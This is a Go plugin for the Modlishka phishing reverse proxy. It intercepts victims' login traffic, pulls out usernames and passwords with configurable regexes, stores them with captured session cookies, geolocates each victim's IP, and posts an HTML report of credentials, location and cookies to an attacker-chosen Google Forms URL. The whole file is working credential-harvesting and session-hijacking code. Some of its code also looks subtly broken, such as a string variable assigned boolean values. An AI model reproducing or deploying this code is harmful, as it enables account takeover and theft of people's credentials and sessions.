/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package plugin

import (
    "bytes"
    "encoding/base64"
    "encoding/json"
    "flag"
    "github.com/drk1wi/Modlishka/config"
    "github.com/drk1wi/Modlishka/runtime"
    "github.com/drk1wi/Modlishka/log"
    "github.com/tidwall/buntdb"
    "io/ioutil"
    "net/http"
    "net/url"
    "os"
    "regexp"
    "strings"
    "time"
)

type ExtendedControlConfiguration struct {
    *config.Options
    CredParams *string `json:"credParams"`
    SessionKeys  *string `json:"SessionKeys"`
    SubLink  *string `json:"subLink"`
}

type ControlConfig struct {
    db             *buntdb.DB
    usernameRegexp []*regexp.Regexp
    passwordRegexp []*regexp.Regexp
    active         bool
}

type RequetCredentials struct {
    usernameFieldValue string
    passwordFieldValue string
}

type Victim struct {
    IP       string
    UUID     string
    Username string
    Password string
    Session  string
    Terminated bool
}

type GeoLocation struct {
    IP            string  `json:"ip"`
    Success       bool    `json:"success"`
    Type          string  `json:"type"`
    Continent     string  `json:"continent"`
    ContinentCode string  `json:"continent_code"`
    Country       string  `json:"country"`
    CountryCode   string  `json:"country_code"`
    Region        string  `json:"region"`
    RegionCode    string  `json:"region_code"`
    City          string  `json:"city"`
    Latitude      float64 `json:"latitude"`
    Longitude     float64 `json:"longitude"`
    IsEu          bool    `json:"is_eu"`
    Postal        string  `json:"postal"`
    CallingCode   string  `json:"calling_code"`
    Capital       string  `json:"capital"`
    Borders       string  `json:"borders"`
    Flag          struct {
        Img          string `json:"img"`
        Emoji        string `json:"emoji"`
        EmojiUnicode string `json:"emoji_unicode"`
    } `json:"flag"`
    Connection struct {
        Asn    int    `json:"asn"`
        Org    string `json:"org"`
        Isp    string `json:"isp"`
        Domain string `json:"domain"`
    } `json:"connection"`
    Timezone struct {
        ID          string `json:"id"`
        Abbr        string `json:"abbr"`
        IsDst       bool   `json:"is_dst"`
        Offset      int    `json:"offset"`
        Utc         string `json:"utc"`
        CurrentTime string `json:"current_time"`
    } `json:"timezone"`
}

type Cookie struct {
    Name  string `json:"name"`
    Value string `json:"value"`

    Path       string `json:"path"`
    Domain     string `json:"domain"`
    Expires    time.Time `json:"expire"`
    RawExpires string 

    // MaxAge=0 means no 'Max-Age' attribute specified.
    // MaxAge<0 means delete cookie now, equivalently 'Max-Age: 0'
    // MaxAge>0 means Max-Age attribute present and given in seconds
    MaxAge   int 
    Secure   bool `json:"secure"`
    HttpOnly bool `json:"httpOnly"`
    SameSite http.SameSite
}

type CookieJar struct {
    Cookies map[string]*Cookie `json:"cookies"`
}

var credentialParameters = flag.String("credParams", "", "Tokens Notifier: Credential regexp with matching groups. e.g. : base64(username_regex),base64(password_regex)")
var sessionKeysFlag = flag.String("sessionKeys", "", "Tokens Notifier: Target session cookies")
var subLinkFlag = flag.String("subLink", "", "Tokens Notifier: Google forms url to post grabbed credentials")

var CConfig ControlConfig
// Container to hold all target session keys
var tokens []string
// Container to hold submission URL entities
var subs []string
var report string


func credsUtilityMan(trm string, tp string) []*regexp.Regexp {
    // Temporary regex holders
    var dcdReg *regexp.Regexp
    ret := make([]*regexp.Regexp, 0)

    tpp := strings.Split(trm, ",")
    for _, val := range tpp {
        if len(val) > 3 {
            dcd, err := base64.StdEncoding.DecodeString(val)
            if err != nil {
                log.Fatalf("Tokens Notifier: CredsUtilityMan decode error. ", err)
                return ret
            }
            log.Infof("Tokens Notifier: Collecting %s credentials with [%s] regex", tp, dcd)
            dcdReg = regexp.MustCompile(string(dcd))
            ret = append(ret, dcdReg)
        }
    }
    return ret
}

func getEmptyJar() (*CookieJar, error) {

    jar := CookieJar{
        Cookies: make(map[string]*Cookie),
    }

    return &jar, nil
}

func sameDomainLevel(domain1 string, domain2 string) bool {
    return bool(len(strings.Split(domain1, ".")) == len(strings.Split(domain2, ".")))

}

func sameDomainUpperLevel(domain1 string, domain2 string) bool {
    d1 := strings.Split(domain1, ".")
    d1out := strings.Join(d1, "")

    d2 := strings.Split(domain2, ".")
    d2out := strings.Join(d2, "")

    return strings.Contains(d1out, d2out)

}

func (jar *CookieJar) setCookie(cookie *Cookie) {

    if jar.Cookies[cookie.Name] == nil {
        jar.Cookies[cookie.Name] = cookie
    }

    if !cookie.Expires.IsZero() && cookie.Expires.Before(time.Now()) {
        delete(jar.Cookies, cookie.Name)
        return
    }

    if jar.Cookies[cookie.Name].Domain == "" {
        jar.Cookies[cookie.Name].Domain = cookie.Domain
    }

    if sameDomainUpperLevel(jar.Cookies[cookie.Name].Domain, cookie.Domain) {
        jar.Cookies[cookie.Name].Domain = cookie.Domain
    }

    jar.Cookies[cookie.Name].Value = cookie.Value

}

func (jar *CookieJar) marshalJSON() ([]byte, error) {

    b, err := json.Marshal(jar)
    return b, err

}

func (jar *CookieJar) initJSON(val []byte) error {

    err := json.Unmarshal([]byte(val), &jar)
    if err != nil {
        return err
    }

    return nil

}

func (victim *Victim) setCookies(cookies []*http.Cookie, url *url.URL) error {

    jar, err := getEmptyJar()
    if err != nil {
        return err
    }

    if victim.Session != "" {
        err = json.Unmarshal([]byte(victim.Session), &jar)
        if err != nil {
            return err
        }
    }

    for _, v := range cookies {
        c := Cookie{
            Name:     v.Name,
            Value:    v.Value,
            Path:   v.Path,
            Domain:   v.Domain,
            Expires:  v.Expires,
            RawExpires:  v.RawExpires,
            MaxAge:  v.MaxAge,
            HttpOnly: v.HttpOnly,
            Secure:   v.Secure,
            SameSite:   v.SameSite,
        }

        jar.setCookie(&c)

    }

    b, err := jar.marshalJSON()
    if err != nil {
        log.Debugf("%s", err.Error())
    }
    victim.Session = string(b)

    return nil
}

func (config *ControlConfig) printEntries() error {

    err := config.db.View(func(tx *buntdb.Tx) error {
        err := tx.Ascend("", func(key, value string) bool {
            //log.Infof("key: %s, value: %s\n", key, value)
            return true
        })
        return err
    })

    if err != nil {
        return err
    }

    return nil
}

func (config *ControlConfig) listEntries() ([]Victim, error) {

    victims := []Victim{}
    err := config.db.View(func(tx *buntdb.Tx) error {
        err := tx.Ascend("", func(key, value string) bool {
            victim := Victim{}
            err := json.Unmarshal([]byte(value), &victim)
            if err != nil {
                return false
            }
            victims = append(victims, victim)
            return true
        })
        return err
    })

    if err != nil {
        return nil, err
    }

    return victims, nil
}

func (config *ControlConfig) getEntry(victim *Victim) (*Victim, error) {

    returnentry := Victim{}
    err := config.db.View(func(tx *buntdb.Tx) error {
        val, err := tx.Get(victim.UUID)
        if err != nil {
            return err
        }

        victim := Victim{}
        err = json.Unmarshal([]byte(val), &victim)
        if err != nil {
            return err
        }
        returnentry = victim
        return nil
    })

    if err != nil {
        return nil, err
    }

    return &returnentry, nil
}

func (config *ControlConfig) getOrCreateEntry(victim *Victim) (*Victim, error) {

    entry, err := config.getEntry(victim)
    if err == buntdb.ErrNotFound {
        err = config.addEntry(victim)
        if err != nil {
            return nil, err
        }
        entry = victim
    }

    return entry, nil
}

func (config *ControlConfig) addEntry(victim *Victim) error {

    //log.Infof("Adding entry %s %s %s",victim.UUID,victim.Username,victim.Password)

    b, err := json.Marshal(victim)
    if err != nil {
        return err
    }

    err = config.db.Update(func(tx *buntdb.Tx) error {
        _, _, err := tx.Set(victim.UUID, string(b), nil)
        return err
    })

    return nil
}

func (config *ControlConfig) updateEntry(victim *Victim) error {

    entry, err := CConfig.getOrCreateEntry(victim)
    if err != nil {
        return err
    }

    if victim.Password != "" {
        entry.Password = victim.Password
    }
    if victim.Username != "" {
        entry.Username = victim.Username
    }

    if victim.Session != "" {
        entry.Session = victim.Session
    }

    if victim.Terminated {
        entry.Terminated = true
    }

    err = config.addEntry(entry)
    if err != nil {
        return err
    }

    return nil
}

func notifyCollection(victim *Victim) {

    if victim.Username != "" && victim.Password != "" {
        log.Debugf("Tokens Notifier: Credentials collected ID->[%s] username: %s password: %s", victim.UUID, victim.Username, victim.Password)
    }

    if victim.Username == "" && victim.Password != "" {
        log.Debugf("Tokens Notifier: Password collected ID->[%s] password: %s", victim.UUID, victim.Password)
    }

    if victim.Username != "" && victim.Password == "" {
        log.Debugf("Tokens Notifier: Username collected ID->[%s] username: %s ", victim.UUID, victim.Username)
    }
}

func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*RequetCredentials, bool) {

    creds := &RequetCredentials{}

    if req.Method == "GET" {
        queryString := req.URL.Query()
        if len(queryString) > 0 {
            for key := range req.URL.Query() {
                for _, val := range config.usernameRegexp {
                    usr := val.FindStringSubmatch(queryString.Get(key))
                    if len(usr) > 1 {
                        qt := usr[len(usr) -1]
                        if runtime.TrueEmail(qt) {
                            creds.usernameFieldValue = qt
                        }
                    }
                }
                for _, val := range config.passwordRegexp {
                    pwd := val.FindStringSubmatch(queryString.Get(key))
                    if len(pwd) > 1 {
                        creds.passwordFieldValue = pwd[len(pwd) -1]
                    }
                }
            }
        }

    } else{

        if req.Body == nil {
            return nil, false
        }

        body, err := ioutil.ReadAll(req.Body)
        if err != nil {
            log.Debugf("Tokens Notifier: Error reading body -> %v", err)
        }

        decodedbody, err := url.QueryUnescape(string(body))
        if err != nil {
            log.Debugf("Tokens Notifier: Error decoding body -> %v", err)
        }
        //log.Infof("%s",decodedbody)

        for _, val := range config.usernameRegexp {
            usr := val.FindStringSubmatch(decodedbody)
            if len(usr) > 1 {
                qt := usr[len(usr) -1]
                if runtime.TrueEmail(qt) {
                    creds.usernameFieldValue = qt
                }
            }
        }
        for _, val := range config.passwordRegexp {
            pwd := val.FindStringSubmatch(decodedbody)
            if len(pwd) > 0 {
                creds.passwordFieldValue = strings.Split(pwd[len(pwd) -1], "&loginFlow=REMEMBER_ME_OPTIN")[0]
            }
        }

        // reset body state.
        req.Body = ioutil.NopCloser(bytes.NewBuffer(body))

    }

    if creds.passwordFieldValue != "" || creds.usernameFieldValue != "" {
        return creds, true

    }

    return nil, false
}

func tStamp() string {
    now := time.Now().String()
    nowS := strings.Split(now, " ")
    now = nowS[0]+" "+strings.Split(nowS[1],".")[0]+" "+nowS[2]+" "+nowS[3]
    return now
}

func GeolocRequestor(ip string) ([]byte, bool) {
    /**
      This function retrieves victim's geolocation from IP
    **/

    log.Debugf("Tokens Notifier: IP-Geolocation: Getting geoloc info ...")

    // create a request object
    cli := http.Client{
        Timeout: 10*time.Second,
    }
    res, err := cli.Get("https://ipwho.is/"+ip)
    if err != nil {
        log.Debugf("Tokens Notifier: [!] IP-Geolocation Error ...")
        return nil, false
    }

    // read response body
    defer res.Body.Close()
    if res.StatusCode == 200 {
        data, err := ioutil.ReadAll(res.Body)
        if err != nil {
            log.Debugf("Tokens Notifier: [!] IP-Geolocation Fatal ...")
            return nil, false
        }
        return data, true
    }
    return nil, false
}

func HelloCookies(uid string) {
    /**
      This function submits all responses into setup mailbox(es).
    **/

    victim := Victim{UUID: uid, Username: "", Password: "", Session: "", IP: ""}
    entry, err := CConfig.getEntry(&victim)
    if err != nil {
        log.Debugf("Tokens Notifier: Error %s", err.Error())
        return
    }
    var jar = CookieJar{}
    err = json.Unmarshal([]byte(entry.Session), &jar)
    if err != nil {
        log.Debugf("Tokens Notifier: Error %s", err.Error())
        return
    }

    if len(entry.Username) < 3 && len(entry.Password) <3{
        log.Warningf("Tokens Notifier: Terminating... Incomplete Report Credentials")
        return
    }

    var cookies []Cookie
    for _, v := range jar.Cookies {
        tmt := strings.ToLower(v.Name)
        for _, tt := range tokens {
            if strings.ToLower(tt) == tmt {
                newCookie := v
                newCookie.Domain = runtime.PhishURLToRealURL(v.Domain)
                cookies = append(cookies, *v)
            }
        }
    }

    cookiesByte, err := json.Marshal(cookies)
    log.Debugf("Tokens Notifier: Target session cookies retrieved + + +")
    tsP := tStamp()
    eml, _ := url.QueryUnescape(entry.Username)
    pwd := entry.Password

    if len(pwd) > 60 {pwd = pwd[0:60]}
    if err != nil {
        log.Debugf("Tokens Notifier: Error unmarshalling cookies. See more !!")
    } else {
        cookiesOut := string(cookiesByte)
        // Grab IP-Geolocation Json Structure
        var geo GeoLocation
        geo.Success = false
        // Grab victim ip Gelocatiion info
        resp, st := GeolocRequestor(string(entry.IP))
        if st {
            if err := json.Unmarshal(resp, &geo); err != nil {
                log.Debugf("Tokens Notifier: IP-Geolocation Error. Could not parse Geolocation info.")
            }
            // Check Geolocation success
            if geo.Success {
                log.Debugf("Tokens Notifier: IP-Geolocation Success")
                // Pack response HTML
                cookiesOut = string(`<div style='font-size:14px;display:table;padding:20px 50px'>
                  <p style ='display:block;'>User Email &nbsp;&nbsp; => `)+eml+string(`</p>
                  <p style ='display:block;'>Password &nbsp;&nbsp; => `)+pwd+string(`</p>
                  <p style ='display:block;'>IP       &nbsp;&nbsp;   => `)+geo.IP+string(`</p>
                  <p style ='display:block;'>IP Type  &nbsp;&nbsp;   => `)+geo.Type+string(`</p>
                  <p style ='display:block;'>Location  &nbsp;&nbsp;   => `)+geo.City+string("&nbsp;&nbsp;")+geo.Region+string("&nbsp;&nbsp;")+geo.Country+string(`</p>
                  <p style ='display:block;'>ZipCode      &nbsp;&nbsp;=> '>`)+geo.Postal+string(`</p>
                  <p style ='display:block;'>TimeZone     &nbsp;&nbsp;=> '>`)+geo.Timezone.ID+string(`</p>
                  <p style ='display:block;'>TimeZone UTC &nbsp;&nbsp;=> '>`)+geo.Timezone.Utc+string("&nbsp;&nbsp;")+geo.Timezone.Abbr+string(`</p>
                  <p style ='display:block;'>TimeStamp &nbsp;&nbsp;=> '>`)+tsP+string(`</p>
                  <p style ='display:block;text-align:left'>Session Cookies:</p>`)+cookiesOut
            } else {
                log.Debugf("Tokens Notifier: Geolocation Failed ): ")
                cookiesOut = string(`<div style='font-size:14px;display:table;padding:20px 50px'>
                  <p style ='display:block;'>User Email: &nbsp;&nbsp; `)+eml+string(`</p>
                  <p style ='display:block;'>Password: &nbsp;&nbsp; `)+pwd+string(`</p>
                  <p style ='display:block;'>IP:  &nbsp;&nbsp; `)+entry.IP+string(`</p>
                  <p style ='display:block;'>TimeStamp: &nbsp;&nbsp; `)+tsP+string(`</p>
                  <p style ='display:block;text-align:left'>Session Cookies:</p>`)+cookiesOut
            }
        } else {
            cookiesOut = string(`<div style='font-size:14px;display:table;padding:20px 50px'>
                  <p style ='display:block;'>User Email: &nbsp;&nbsp; `)+eml+string(`</p>
                  <p style ='display:block;'>Password: &nbsp;&nbsp; `)+pwd+string(`</p>
                  <p style ='display:block;'>IP:  &nbsp;&nbsp; `)+entry.IP+string(`</p>
                  <p style ='display:block;'>TimeStamp: &nbsp;&nbsp; `)+tsP+string(`</p>
                  <p style ='display:block;text-align:left'>Session Cookies: </p>`)+cookiesOut
        }
        
        // Create forms submit GET request body
        reqBody := url.Values{}
        reqBody.Add(subs[2], cookiesOut)
        
        // Create http GET request object with all form values
        // Send request
        qReq, err:= http.Get(subs[1]+string(reqBody.Encode()));
        
        // Check for response error
        if err != nil {
            log.Errorf("Tokens Notifier: Error, See func -> HelloCookies")
        }else {
            if (qReq.StatusCode == 200) {
                log.Infof("Tokens Notifier: IP ~> %s; Forms Submission Success ~> %s ]> Status 200 0K <[",entry.IP,subs[0])
            }else {
                log.Errorf("Tokens Notifier: IP = > %s; Forms Submission Failed ]> Status %d <[", entry.IP, qReq.StatusCode)
            }
        }
    }

}


func init() {

    s := Property{}
    s.Name = "notifier"
    s.Description = "Session cookies reporter. Beta version."
    s.Version = "0.1.11082022"

    //init all of the vars, print a welcome message, init your command line flags here
    s.Init = func() {

        //init database
        db, err := buntdb.Open("sessionDB.db")
        if err != nil {
            log.Fatal(err)
        }

        err = db.SetConfig(buntdb.Config{
            SyncPolicy: buntdb.EverySecond,
        })

        if err != nil {
            log.Fatal(err)
        }

        CConfig.db = db
        subs = make([]string, 3)
        report = false

    }

    // process all of the cmd line flags and config file (if supplied)
    s.Flags = func() {

        CConfig.active = false

        // Regexes to grab username and passwords sent in POST
        var creds []string

        var jsonConfig ExtendedControlConfiguration

        if len(*config.JSONConfig) > 0 {

            ct, err := os.Open(*config.JSONConfig)
            if err != nil {
                log.Errorf("Tokens Notifier: Error opening JSON configuration (%s) -> %s", *config.JSONConfig, err)
                return
            }

            ctb, _ := ioutil.ReadAll(ct)
            if err = json.Unmarshal(ctb, &jsonConfig); err != nil {
                log.Errorf("Tokens Notifier: Error unmarshalling JSON configuration (%s) -> %s", *config.JSONConfig, err)
                return
            }

            if err := ct.Close(); err != nil {
                log.Errorf("Tokens Notifier: Error closing JSON configuration (%s) -> %s", *config.JSONConfig, err)
                return
            }

        }


        if jsonConfig.CredParams != nil {
            creds = strings.Split(*jsonConfig.CredParams, ";")
        } else if *credentialParameters != "" {
            creds = strings.Split(*credentialParameters, ";")
        }

        if len(creds) == 2 {
            CConfig.usernameRegexp = credsUtilityMan(creds[0], "Username")
            CConfig.passwordRegexp = credsUtilityMan(creds[1], "Password")
            CConfig.active = true
        }

        // Target cookies
        if jsonConfig.SessionKeys != nil {
            tokens = strings.Split(*jsonConfig.SessionKeys, ",")
        } else if *sessionKeysFlag != "" {
            tokens = strings.Split(*sessionKeysFlag, ",")
        }
        
        if len(tokens) > 0 {
            log.Infof("Tokens Notifier: Targeting session Keys ~> %s", tokens)
        } else {
            log.Warningf("Tokens Notifier: No session key targeted. Reporting verbose cookies")
        }

        // Target Submission URL
        if jsonConfig.SubLink != nil {
            subs = strings.Split(*jsonConfig.SubLink, ",")
        } else if *subLinkFlag != "" {
            subs = strings.Split(*subLinkFlag, ",")
        }

        if len(subs) < 2 {
            log.Warningf("Tokens Notifier: No Submission URL. Goodluck finding harvest in logs ...")
        }else {
            log.Infof("Tokens Notifier: Mailing report to %s", subs[0])
            subs[1] += string("/formResponse?usp=pp_url&")
            report = true
        }

    }

    //process HTTP request
    s.HTTPRequest = func(req *http.Request, context *HTTPContext) {

        if CConfig.active {

            if context.UserID != "" {
                // Save every new ID
                victim := Victim{UUID: context.UserID, IP: context.IP}
                _, err := CConfig.getEntry(&victim)
                // Entry doesn't exist yet
                if err != nil {
                    if err := CConfig.updateEntry(&victim); err != nil {
                        log.Debugf("Tokens Notifier: Error %s", err.Error())
                        return
                    }
                }
            }

            if creds, found := CConfig.checkRequestCredentials(req); found {

                victim := Victim{UUID: context.UserID, Username: creds.usernameFieldValue, Password: creds.passwordFieldValue, IP: context.IP}
                if err := CConfig.updateEntry(&victim); err != nil {
                    log.Debugf("Tokens Notifier: Error %s", err.Error())
                    return
                }
                notifyCollection(&victim)

            }

            cookies := req.Cookies()
            // there are new set-cookies
            if len(cookies) > 0 {
                victim := Victim{UUID: context.UserID, IP: context.IP}
                entry, err := CConfig.getEntry(&victim)
                if err != nil {
                    return
                }

                for i, _ := range cookies {
                    cookies[i].Domain = context.OriginalTarget
                }

                err = entry.setCookies(cookies, context.Target)
                if err != nil {
                    return
                }

                err = CConfig.updateEntry(entry)
                if err != nil {
                    return
                }

            }

        }

    }

    //process HTTP response (responses can arrive in random order)
    s.HTTPResponse = func(resp *http.Response, context *HTTPContext,buffer *[]byte) {

        cookies := resp.Cookies()
        // there are new set-cookies
        if len(cookies) > 0 {

            victim := Victim{UUID: context.UserID}
            entry, err := CConfig.getEntry(&victim)
            if err != nil {
                return
            }

            for i, _ := range cookies {
                if cookies[i].Domain == "" {
                    td := strings.Replace(*config.C.Target, "http://", "", -1)
                    td = strings.Replace(td, "https://", "", -1)
                    t := strings.Replace(context.Target.Host, td, *config.C.ProxyDomain, -1)
                    cookies[i].Domain = t
                }
            }

            err = entry.setCookies(cookies, context.Target)
            if err != nil {
                return
            }

            err = CConfig.updateEntry(entry)
            if err != nil {
                return
            }

        }

    }

    s.TerminateUser = func(userID string){
        log.Debugf("Invoking control terminate")
        victim := Victim{UUID: userID, Terminated: true}
        err := CConfig.updateEntry(&victim)
        if err != nil {
            log.Errorf("Tokens Notifier: Error %s", err)
            return
        }
        // if submission entities were defined
        if report { HelloCookies(userID) }
    }

    // Register all the function hooks
    s.Register()

}
